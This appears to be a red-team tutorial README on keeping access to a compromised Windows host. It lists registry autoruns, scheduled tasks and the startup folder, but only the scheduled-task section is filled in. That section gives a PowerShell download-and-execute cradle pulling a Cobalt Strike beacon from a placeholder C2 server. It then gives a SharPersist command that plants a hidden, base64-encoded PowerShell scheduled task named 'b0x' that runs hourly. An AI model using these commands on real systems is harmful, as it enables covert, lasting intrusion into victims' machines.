# Methods of regaining or maintaining access to a compromised host

Following methods can be used to regain access to a compromised host.

#### <b>1.</b> <a href="https://github.com/incredibleindishell/Red_Team_Op/new/main#1-registry-autoruns-1">Registry Autoruns</a>
#### <b>2.</b> <a href="https://github.com/incredibleindishell/Red_Team_Op/new/main#2-scheduled-tasks-1">Scheduled Tasks</a>
#### <b>3.</b> <a href="https://github.com/incredibleindishell/Red_Team_Op/new/main#3-startup-folder-1">Startup Folder</a>

To create the payloads for above mentioned scenarios, user can use SharPersist tool from below mentioned Github Repo:

https://github.com/mandiant/SharPersist

SharPersist allows a user to create payload for different backdooring techniques. 

It supports following options/arguments 

    -t: Persistence technique
    -c: Command to execute
    -a: Arguments of command to execute (if applicable)
    -f: File to create/modify
    -k: Registry key to create/modify
    -v: Registry value to create/modify
    -n: Scheduled task name OR Service name
    -m: Method(add, remove, check, list)
    -o: Optional add-ons
    -h: Help page


#### 1. Registry Autoruns
---


#### 2. Scheduled Tasks
---

In local machine, open PowerShell console and execute below mentioned commands to generate the base64 encoded text of the Cobalt strike's PowerShell based beacon payload:

    PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://cobalt_strike_server/poershell_payload"))'
    PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

In Cobalt strike beacon console, execute below mentioned command (replace text Base_64_encoded_payload_goes_here with the output generated in the above step) to add a new scheduled task with name `b0x` which will execute after every one hour:
    
    execute-assembly C:\Path_to_sharpersist\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc Base_64_encoded_payload_goes_here" -n "b0x" -m add -o hourly


#### 3. Startup Folder
---

